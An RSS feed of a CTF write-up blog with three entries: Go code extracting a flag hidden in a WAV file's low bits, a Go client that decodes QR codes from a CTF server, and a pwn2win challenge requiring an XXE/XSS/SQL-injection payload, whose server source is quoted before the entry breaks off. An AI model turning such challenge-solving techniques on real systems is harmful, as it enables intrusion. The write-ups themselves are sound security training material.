<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title>Posts on Eve&#39;s CTF Writeups</title>
		<link>https://freeeve.github.io/ctf-writeups/posts/</link>
		<description>Recent content in Posts on Eve&#39;s CTF Writeups</description>
		<generator>Hugo -- gohugo.io</generator>
		<language>en-us</language>
		<copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright>
		<lastBuildDate>Thu, 11 Jun 2020 00:33:40 -0400</lastBuildDate>
		<atom:link href="https://freeeve.github.io/ctf-writeups/posts/index.xml" rel="self" type="application/rss+xml" />
		
		<item>
			<title>Defenit: Baby Steganography</title>
			<link>https://freeeve.github.io/ctf-writeups/posts/2020/defenit/baby-steganography/</link>
			<pubDate>Thu, 11 Jun 2020 00:33:40 -0400</pubDate>
			
			<guid>https://freeeve.github.io/ctf-writeups/posts/2020/defenit/baby-steganography/</guid>
			<description>They give you a file without an extension, and hint that the &amp;ldquo;sub bit&amp;rdquo; contains some hidden data. problem file
When I opened the file in hex fiend, I could see the header of RIFF‡ı∏WAVEfmt, indicating that it was a wav file. So I looked for a wav library, pulled out the samples, and tried to figure out where it might be hiding.
There were two channels, left and right, and 16 bits for samples.</description>
			<content type="html"><![CDATA[<p>They give you a file without an extension, and hint that the &ldquo;sub bit&rdquo; contains
some hidden data. <a href="/ctf-writeups/defenit/problem">problem file</a></p>
<p>When I opened the file in hex fiend, I could see the header of
<code>RIFF‡ı∏WAVEfmt</code>, indicating that it was a wav file. So I looked for a wav
library, pulled out the samples, and tried to figure out where it might
be hiding.</p>
<p>There were two channels, left and right, and 16 bits for samples. I tried
looking in the LSB of each channel, both channels, putting the bits together
into bytes, but didn&rsquo;t find anything interesting. It was my teammate that tried the LSB of
each byte, which ended up being correct.</p>
<p>Here&rsquo;s the final code, with some comments:</p>
<div class="highlight"><pre class="chroma"><code class="language-baby-stega.go" data-lang="baby-stega.go"><span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="p">(</span>
	<span class="s">&#34;fmt&#34;</span>
	<span class="s">&#34;io&#34;</span>
	<span class="s">&#34;os&#34;</span>

	<span class="nx">wav</span> <span class="s">&#34;github.com/youpy/go-wav&#34;</span>
<span class="p">)</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="nx">file</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">Open</span><span class="p">(</span><span class="s">&#34;problem&#34;</span><span class="p">)</span>
	<span class="k">defer</span> <span class="nx">file</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
	<span class="nx">reader</span> <span class="o">:=</span> <span class="nx">wav</span><span class="p">.</span><span class="nf">NewReader</span><span class="p">(</span><span class="nx">file</span><span class="p">)</span>

	<span class="nx">arr</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span> <span class="mi">4096</span><span class="p">)</span>
	<span class="kd">var</span> <span class="nx">buildingByte</span> <span class="kt">byte</span>
	<span class="kd">var</span> <span class="nx">bitPosition</span> <span class="kt">int</span>
	<span class="k">for</span> <span class="p">{</span>
		<span class="c1">// this code was originally broken up like this to read samples
</span><span class="c1"></span>		<span class="c1">// and get the left and right sample LSB
</span><span class="c1"></span>		<span class="nx">n</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">reader</span><span class="p">.</span><span class="nf">Read</span><span class="p">(</span><span class="nx">arr</span><span class="p">)</span>
		<span class="k">if</span> <span class="nx">err</span> <span class="o">==</span> <span class="nx">io</span><span class="p">.</span><span class="nx">EOF</span> <span class="p">{</span>
			<span class="k">break</span>
		<span class="p">}</span>
		<span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">b</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">arr</span><span class="p">[:</span><span class="nx">n</span><span class="p">]</span> <span class="p">{</span>
			<span class="c1">// when we&#39;ve filled the byte (8 bits)
</span><span class="c1"></span>			<span class="k">if</span> <span class="nx">bitPosition</span> <span class="o">==</span> <span class="mi">8</span> <span class="p">{</span>
				<span class="c1">// skip common bytes we don&#39;t care about
</span><span class="c1"></span>				<span class="c1">// ... discovered after running
</span><span class="c1"></span>				<span class="k">if</span> <span class="nx">buildingByte</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">buildingByte</span> <span class="o">!=</span> <span class="sc">&#39;#&#39;</span> <span class="p">{</span>
					<span class="nx">fmt</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;%c&#34;</span><span class="p">,</span> <span class="nx">buildingByte</span><span class="p">)</span>
				<span class="p">}</span>
				<span class="c1">// reset byte and position
</span><span class="c1"></span>				<span class="nx">buildingByte</span> <span class="p">=</span> <span class="mi">0</span>
				<span class="nx">bitPosition</span> <span class="p">=</span> <span class="mi">0</span>
			<span class="p">}</span>
			<span class="c1">// shift and or the bit into position
</span><span class="c1"></span>			<span class="nx">buildingByte</span> <span class="o">|=</span> <span class="p">((</span><span class="nx">b</span> <span class="o">&amp;</span> <span class="mh">0x1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">7</span> <span class="o">-</span> <span class="nx">bitPosition</span><span class="p">))</span>
			<span class="nx">bitPosition</span><span class="o">++</span>
		<span class="p">}</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>and the output:</p>
<pre><code>Defenit{Y0u_knOw_tH3_@uD10_5t39@No9rAphy?!}
</code></pre>]]></content>
		</item>
		
		<item>
			<title>Defenit: QR Generator</title>
			<link>https://freeeve.github.io/ctf-writeups/posts/2020/defenit/qr-generator/</link>
			<pubDate>Tue, 09 Jun 2020 01:16:06 -0400</pubDate>
			
			<guid>https://freeeve.github.io/ctf-writeups/posts/2020/defenit/qr-generator/</guid>
			<description>When you first connect to the server, it asks you for a name, and then starts spitting out ones and zeros in a grid format, and gives you a prompt &amp;gt;&amp;gt; but times out pretty quickly. I decided to take a chance and assume they wanted the QR code output. Here&amp;rsquo;s what the service spit out, after the name prompt and some comments about levels:
&amp;lt; QR &amp;gt; 1 1 1 1 1 1 1 0 1 0 1 0 1 0 0 0 0 1 0 0 1 0 1 1 1 1 1 1 1 1 0 0 0 0 0 1 0 1 0 0 1 1 0 0 0 1 0 0 0 1 0 1 0 0 0 0 0 1 1 0 1 1 1 0 1 0 0 1 1 1 1 1 0 1 0 0 0 1 0 0 1 0 1 1 1 0 1 1 0 1 1 1 0 1 0 0 0 1 1 1 0 1 0 0 0 0 1 1 0 1 0 1 1 1 0 1 1 0 1 1 1 0 1 0 1 0 0 0 0 1 0 0 0 1 1 1 0 0 1 0 1 1 1 0 1 1 0 0 0 0 0 1 0 1 0 0 1 0 1 0 1 0 0 0 0 0 0 1 0 0 0 0 0 1 1 1 1 1 1 1 1 0 1 0 1 0 1 0 1 0 1 0 1 0 1 0 1 1 1 1 1 1 1 0 0 0 0 0 0 0 0 0 0 1 0 1 1 0 1 1 0 1 0 0 0 0 0 0 0 0 0 0 1 1 1 1 0 1 1 0 0 0 0 1 1 1 0 1 1 0 1 0 0 1 0 1 1 0 0 1 1 1 1 0 1 0 0 0 1 0 1 0 0 0 1 1 0 1 1 0 0 1 1 0 1 1 1 0 0 0 1 1 1 0 0 0 1 0 0 1 0 1 1 0 1 0 1 0 1 1 0 0 1 0 0 1 1 0 0 0 0 1 1 0 1 0 0 1 0 1 1 0 0 0 0 1 0 1 1 0 0 0 0 1 0 1 1 0 1 0 0 0 0 1 1 1 0 1 1 0 1 0 0 1 0 1 1 0 1 0 0 1 0 1 1 0 1 0 0 0 1 1 1 0 0 1 0 1 1 1 1 0 0 1 0 1 1 1 1 0 0 1 0 1 1 1 1 1 1 0 0 1 1 0 1 1 1 0 0 1 0 1 1 0 1 0 0 1 0 1 1 0 1 0 0 1 0 1 1 1 0 0 0 1 0 1 0 0 1 1 1 0 0 1 0 1 1 1 0 0 0 1 0 1 1 0 1 0 0 0 1 1 1 1 0 1 1 1 0 1 1 1 1 0 0 1 0 1 0 1 0 1 0 0 0 1 1 0 0 0 1 0 1 1 1 1 0 0 1 0 1 0 1 1 1 1 1 1 0 0 1 0 0 0 1 1 0 0 1 0 0 1 1 0 1 0 1 0 0 1 0 0 0 0 0 1 0 0 1 1 0 0 1 0 0 0 1 0 1 1 1 0 1 1 0 0 1 1 1 0 1 1 0 1 1 1 0 0 1 0 1 1 1 1 0 0 1 0 1 0 0 1 0 1 0 1 0 0 1 1 1 1 1 1 1 1 1 1 1 0 0 0 0 0 0 0 0 0 1 0 1 1 1 1 0 1 0 1 0 1 0 0 0 1 1 1 1 1 1 1 1 1 1 1 1 0 0 0 1 0 0 0 1 1 0 1 0 1 1 0 1 0 1 0 1 1 0 1 0 0 0 0 0 1 0 1 1 1 1 0 1 1 1 1 1 0 0 1 0 0 0 1 0 0 1 1 1 0 1 1 1 0 1 0 0 1 1 1 0 1 0 0 0 1 1 0 1 1 1 1 1 1 0 0 1 1 0 1 1 1 0 1 0 1 1 0 1 1 1 1 1 0 1 1 0 0 1 1 1 1 0 0 1 0 1 0 1 1 1 0 1 0 1 1 1 0 1 0 1 0 0 1 1 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 1 0 1 1 0 1 0 1 1 0 0 1 0 0 0 1 0 1 1 0 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 0 1 1 0 0 1 1 0 0 1 1 0 0 1 1 1 0 &amp;gt;&amp;gt; Eventually I realized it needed to handle varying sizes of QR codes and handle reading until the prompt.</description>
			<content type="html"><![CDATA[<p>When you first connect to the server, it asks you for a name,
and then starts spitting out ones and zeros in a grid format, and
gives you a prompt <code>&gt;&gt;</code> but times out pretty quickly. I decided to
take a chance and assume they wanted the QR code output. Here&rsquo;s
what the service spit out, after the name prompt and some comments about levels:</p>
<pre><code>&lt; QR &gt;
1 1 1 1 1 1 1 0 1 0 1 0 1 0 0 0 0 1 0 0 1 0 1 1 1 1 1 1 1
1 0 0 0 0 0 1 0 1 0 0 1 1 0 0 0 1 0 0 0 1 0 1 0 0 0 0 0 1
1 0 1 1 1 0 1 0 0 1 1 1 1 1 0 1 0 0 0 1 0 0 1 0 1 1 1 0 1
1 0 1 1 1 0 1 0 0 0 1 1 1 0 1 0 0 0 0 1 1 0 1 0 1 1 1 0 1
1 0 1 1 1 0 1 0 1 0 0 0 0 1 0 0 0 1 1 1 0 0 1 0 1 1 1 0 1
1 0 0 0 0 0 1 0 1 0 0 1 0 1 0 1 0 0 0 0 0 0 1 0 0 0 0 0 1
1 1 1 1 1 1 1 0 1 0 1 0 1 0 1 0 1 0 1 0 1 0 1 1 1 1 1 1 1
0 0 0 0 0 0 0 0 0 0 1 0 1 1 0 1 1 0 1 0 0 0 0 0 0 0 0 0 0
1 1 1 1 0 1 1 0 0 0 0 1 1 1 0 1 1 0 1 0 0 1 0 1 1 0 0 1 1
1 1 0 1 0 0 0 1 0 1 0 0 0 1 1 0 1 1 0 0 1 1 0 1 1 1 0 0 0
1 1 1 0 0 0 1 0 0 1 0 1 1 0 1 0 1 0 1 1 0 0 1 0 0 1 1 0 0
0 0 1 1 0 1 0 0 1 0 1 1 0 0 0 0 1 0 1 1 0 0 0 0 1 0 1 1 0
1 0 0 0 0 1 1 1 0 1 1 0 1 0 0 1 0 1 1 0 1 0 0 1 0 1 1 0 1
0 0 0 1 1 1 0 0 1 0 1 1 1 1 0 0 1 0 1 1 1 1 0 0 1 0 1 1 1
1 1 1 0 0 1 1 0 1 1 1 0 0 1 0 1 1 0 1 0 0 1 0 1 1 0 1 0 0
1 0 1 1 1 0 0 0 1 0 1 0 0 1 1 1 0 0 1 0 1 1 1 0 0 0 1 0 1
1 0 1 0 0 0 1 1 1 1 0 1 1 1 0 1 1 1 1 0 0 1 0 1 0 1 0 1 0
0 0 1 1 0 0 0 1 0 1 1 1 1 0 0 1 0 1 0 1 1 1 1 1 1 0 0 1 0
0 0 1 1 0 0 1 0 0 1 1 0 1 0 1 0 0 1 0 0 0 0 0 1 0 0 1 1 0
0 1 0 0 0 1 0 1 1 1 0 1 1 0 0 1 1 1 0 1 1 0 1 1 1 0 0 1 0
1 1 1 1 0 0 1 0 1 0 0 1 0 1 0 1 0 0 1 1 1 1 1 1 1 1 1 1 1
0 0 0 0 0 0 0 0 0 1 0 1 1 1 1 0 1 0 1 0 1 0 0 0 1 1 1 1 1
1 1 1 1 1 1 1 0 0 0 1 0 0 0 1 1 0 1 0 1 1 0 1 0 1 0 1 1 0
1 0 0 0 0 0 1 0 1 1 1 1 0 1 1 1 1 1 0 0 1 0 0 0 1 0 0 1 1
1 0 1 1 1 0 1 0 0 1 1 1 0 1 0 0 0 1 1 0 1 1 1 1 1 1 0 0 1
1 0 1 1 1 0 1 0 1 1 0 1 1 1 1 1 0 1 1 0 0 1 1 1 1 0 0 1 0
1 0 1 1 1 0 1 0 1 1 1 0 1 0 1 0 0 1 1 0 0 0 0 0 0 0 0 0 0
1 0 0 0 0 0 1 0 1 1 0 1 0 1 1 0 0 1 0 0 0 1 0 1 1 0 1 1 1
1 1 1 1 1 1 1 0 1 1 1 1 0 1 1 0 0 1 1 0 0 1 1 0 0 1 1 1 0

&gt;&gt; 
</code></pre><p>Eventually I realized it needed to handle varying sizes of QR codes and
handle reading until the prompt.</p>
<p>Here is my code:</p>
<div class="highlight"><pre class="chroma"><code class="language-qr.go" data-lang="qr.go"><span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="p">(</span>
    <span class="s">&#34;fmt&#34;</span>
    <span class="s">&#34;image&#34;</span>
    <span class="s">&#34;image/color&#34;</span>
    <span class="s">&#34;log&#34;</span>
    <span class="s">&#34;net&#34;</span>
    <span class="s">&#34;strings&#34;</span>

    <span class="s">&#34;github.com/makiuchi-d/gozxing&#34;</span>
    <span class="s">&#34;github.com/makiuchi-d/gozxing/qrcode&#34;</span>
<span class="p">)</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">con</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">net</span><span class="p">.</span><span class="nf">Dial</span><span class="p">(</span><span class="s">&#34;tcp&#34;</span><span class="p">,</span> <span class="s">&#34;qr-generator.ctf.defenit.kr:9000&#34;</span><span class="p">)</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="k">defer</span> <span class="nx">con</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
    <span class="nx">qrmark</span> <span class="o">:=</span> <span class="s">&#34;&lt; QR &gt;&#34;</span>
    <span class="nx">buf</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span> <span class="mi">1024</span><span class="o">*</span><span class="mi">16</span><span class="p">)</span>
    <span class="nx">nBytes</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">con</span><span class="p">.</span><span class="nf">Read</span><span class="p">(</span><span class="nx">buf</span><span class="p">)</span>
    <span class="nx">nBytes</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">con</span><span class="p">.</span><span class="nf">Read</span><span class="p">(</span><span class="nx">buf</span><span class="p">)</span>
    <span class="nx">nBytes</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">con</span><span class="p">.</span><span class="nf">Write</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&#34;E\n&#34;</span><span class="p">))</span>
    <span class="nx">codestr</span> <span class="o">:=</span> <span class="s">&#34;&#34;</span>
    <span class="k">for</span> <span class="p">{</span>
        <span class="nx">nBytes</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">con</span><span class="p">.</span><span class="nf">Read</span><span class="p">(</span><span class="nx">buf</span><span class="p">)</span>
        <span class="nx">codestr</span> <span class="p">=</span> <span class="nx">codestr</span> <span class="o">+</span> <span class="nb">string</span><span class="p">(</span><span class="nx">buf</span><span class="p">[:</span><span class="nx">nBytes</span><span class="p">])</span>
        <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">codestr</span><span class="p">)</span>
        <span class="k">if</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Index</span><span class="p">(</span><span class="nx">codestr</span><span class="p">,</span> <span class="s">&#34;Defenit{&#34;</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="p">{</span>
            <span class="k">break</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Index</span><span class="p">(</span><span class="nx">codestr</span><span class="p">,</span> <span class="nx">qrmark</span><span class="p">)</span> <span class="p">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Index</span><span class="p">(</span><span class="nx">codestr</span><span class="p">,</span> <span class="s">&#34;&gt;&gt;&#34;</span><span class="p">)</span> <span class="p">&lt;</span> <span class="mi">0</span> <span class="p">{</span>
            <span class="k">continue</span>
        <span class="p">}</span>
        <span class="nx">codestr</span> <span class="p">=</span> <span class="nx">codestr</span><span class="p">[</span><span class="nx">strings</span><span class="p">.</span><span class="nf">Index</span><span class="p">(</span><span class="nx">codestr</span><span class="p">,</span> <span class="nx">qrmark</span><span class="p">):]</span>

        <span class="nx">lines</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Split</span><span class="p">(</span><span class="nx">codestr</span><span class="p">,</span> <span class="s">&#34;\n&#34;</span><span class="p">)</span>
        <span class="nx">width</span> <span class="o">:=</span> <span class="nb">len</span><span class="p">(</span><span class="nx">strings</span><span class="p">.</span><span class="nf">Split</span><span class="p">(</span><span class="nx">lines</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">&#34; &#34;</span><span class="p">))</span>
        <span class="nx">img</span> <span class="o">:=</span> <span class="nx">image</span><span class="p">.</span><span class="nf">NewRGBA</span><span class="p">(</span><span class="nx">image</span><span class="p">.</span><span class="nx">Rectangle</span><span class="p">{</span><span class="nx">image</span><span class="p">.</span><span class="nx">Point</span><span class="p">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">},</span> <span class="nx">image</span><span class="p">.</span><span class="nx">Point</span><span class="p">{</span><span class="nx">width</span><span class="p">,</span> <span class="nx">width</span><span class="p">}})</span>
        <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;qr code width:&#34;</span><span class="p">,</span> <span class="nx">width</span><span class="p">)</span>
        <span class="k">for</span> <span class="nx">x</span><span class="p">,</span> <span class="nx">line</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">lines</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span> <span class="p">{</span>
            <span class="nx">arr</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Split</span><span class="p">(</span><span class="nx">line</span><span class="p">,</span> <span class="s">&#34; &#34;</span><span class="p">)</span>
            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="nx">arr</span><span class="p">)</span> <span class="o">==</span> <span class="nx">width</span> <span class="p">{</span>
                <span class="k">for</span> <span class="nx">y</span><span class="p">,</span> <span class="nx">val</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">arr</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="nx">val</span> <span class="o">==</span> <span class="s">&#34;1&#34;</span> <span class="p">{</span>
                        <span class="nx">img</span><span class="p">.</span><span class="nf">Set</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="p">,</span> <span class="nx">color</span><span class="p">.</span><span class="nx">Black</span><span class="p">)</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="k">break</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="nx">bmp</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">gozxing</span><span class="p">.</span><span class="nf">NewBinaryBitmapFromImage</span><span class="p">(</span><span class="nx">img</span><span class="p">)</span>
        <span class="nx">qrReader</span> <span class="o">:=</span> <span class="nx">qrcode</span><span class="p">.</span><span class="nf">NewQRCodeReader</span><span class="p">()</span>
        <span class="nx">text</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">qrReader</span><span class="p">.</span><span class="nf">Decode</span><span class="p">(</span><span class="nx">bmp</span><span class="p">,</span> <span class="kc">nil</span><span class="p">)</span>
        <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
            <span class="nx">log</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
        <span class="p">}</span>
        <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;qrcode value:&#34;</span><span class="p">,</span> <span class="nx">text</span><span class="p">)</span>
        <span class="nx">con</span><span class="p">.</span><span class="nf">Write</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">fmt</span><span class="p">.</span><span class="nf">Sprintf</span><span class="p">(</span><span class="s">&#34;%s\n&#34;</span><span class="p">,</span> <span class="nx">text</span><span class="p">)))</span>
        <span class="nx">codestr</span> <span class="p">=</span> <span class="s">&#34;&#34;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>]]></content>
		</item>
		
		<item>
			<title>pwn2win: A Payload To Rule Them All</title>
			<link>https://freeeve.github.io/ctf-writeups/posts/2020/pwn2win/a-payload-to-rule-them-all/</link>
			<pubDate>Mon, 08 Jun 2020 00:00:00 +0000</pubDate>
			
			<guid>https://freeeve.github.io/ctf-writeups/posts/2020/pwn2win/a-payload-to-rule-them-all/</guid>
			<description>This one gives us a post endpoint for a payload that needs to exploit xxe, xss, and sqli (sql injection), as well as the code for the server:
const express = require(&amp;#34;express&amp;#34;) const app = express() const bodyParser = require(&amp;#34;body-parser&amp;#34;) const port = 31337 const { execFile } = require(&amp;#34;child_process&amp;#34;) const fs = require(&amp;#34;fs&amp;#34;) const rateLimit = require(&amp;#34;express-rate-limit&amp;#34;); app.use(express.static(&amp;#34;static&amp;#34;)) app.use(bodyParser.urlencoded({ extended: true })) const limiter = rateLimit({ windowMs: 10 * 60 * 1000, max: 50 }); // 15 minutes // limit each IP to 100 requests per windowMs app.</description>
			<content type="html"><![CDATA[<p>This one gives us a post endpoint for a payload that needs to exploit xxe, xss,
and sqli (sql injection), as well as the code for the server:</p>
<div class="highlight"><pre class="chroma"><code class="language-server.js" data-lang="server.js"><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;express&#34;</span><span class="p">)</span>
<span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">()</span>
<span class="kr">const</span> <span class="nx">bodyParser</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;body-parser&#34;</span><span class="p">)</span>
<span class="kr">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="mi">31337</span>
<span class="kr">const</span> <span class="p">{</span> <span class="nx">execFile</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;child_process&#34;</span><span class="p">)</span>
<span class="kr">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;fs&#34;</span><span class="p">)</span>
<span class="kr">const</span> <span class="nx">rateLimit</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;express-rate-limit&#34;</span><span class="p">);</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="kr">static</span><span class="p">(</span><span class="s2">&#34;static&#34;</span><span class="p">))</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">bodyParser</span><span class="p">.</span><span class="nx">urlencoded</span><span class="p">({</span> <span class="nx">extended</span><span class="o">:</span> <span class="kc">true</span> <span class="p">}))</span>
<span class="kr">const</span> <span class="nx">limiter</span> <span class="o">=</span> <span class="nx">rateLimit</span><span class="p">({</span> <span class="nx">windowMs</span><span class="o">:</span> <span class="mi">10</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">,</span> <span class="nx">max</span><span class="o">:</span> <span class="mi">50</span> <span class="p">});</span>
<span class="c1">// 15 minutes  // limit each IP to 100 requests per windowMs 
</span><span class="c1"></span><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nx">limiter</span><span class="p">);</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="kr">const</span> <span class="nx">test_payload</span> <span class="o">=</span> <span class="nx">execFile</span><span class="p">(</span><span class="s2">&#34;/usr/sbin/gosu&#34;</span><span class="p">,</span> <span class="p">[</span><span class="s2">&#34;gnx&#34;</span><span class="p">,</span> <span class="s2">&#34;/home/gnx/script/test_payload.js&#34;</span><span class="p">,</span>
        <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">payload</span><span class="p">],</span> <span class="p">(</span><span class="nx">error</span><span class="p">,</span> <span class="nx">stdout</span><span class="p">,</span> <span class="nx">stderr</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">stdout</span><span class="p">.</span><span class="nx">toString</span><span class="p">().</span><span class="nx">trim</span><span class="p">()</span> <span class="o">===</span> <span class="s2">&#34;parabens hackudo&#34;</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">FLAG</span><span class="p">)</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> 
                <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;nope&#34;</span><span class="p">)</span> 
            <span class="p">}</span>
        <span class="p">});</span> 
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">payload</span><span class="p">)</span>
<span class="p">})</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/source&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">out</span> <span class="o">=</span> <span class="s2">&#34;/usr/src/app/index.js :\n\n&#34;</span> <span class="o">+</span>
        <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s2">&#34;/usr/src/app/index.js&#34;</span><span class="p">).</span><span class="nx">toString</span><span class="p">()</span> <span class="o">+</span>
        <span class="s2">&#34;\n\n&#34;</span>
    <span class="nx">out</span> <span class="o">+=</span> <span class="s2">&#34;/home/gnx/script/test_payload.js :\n\n&#34;</span> <span class="o">+</span>
        <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s2">&#34;/home/gnx/script/test_payload.js&#34;</span><span class="p">)</span> <span class="o">+</span>
        <span class="s2">&#34;\n\n&#34;</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">out</span><span class="p">)</span>
<span class="p">})</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span> <span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Chall rodando em http://localhost:</span><span class="si">${</span><span class="nx">port</span><span class="si">}</span><span class="sb">`</span><span class="p">))</span>
</code></pre></div><p>as well as the <code>test_payload.js</code> referenced above:</p>
<div class="highlight"><pre class="chroma"><code class="language-test_payload.js" data-lang="test_payload.js"><span class="ch">#!/usr/bin /env node
</span><span class="ch"></span><span class="kr">const</span> <span class="nx">puppeteer</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;puppeteer&#39;</span><span class="p">)</span>
<span class="kr">const</span> <span class="nx">mysql</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;mysql&#34;</span><span class="p">)</span>
<span class="kr">const</span> <span class="nx">util</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;util&#39;</span><span class="p">)</span>
<span class="kr">const</span> <span class="nx">libxml</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;libxmljs&#34;</span><span class="p">)</span>
<span class="kr">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;fs&#34;</span><span class="p">)</span>
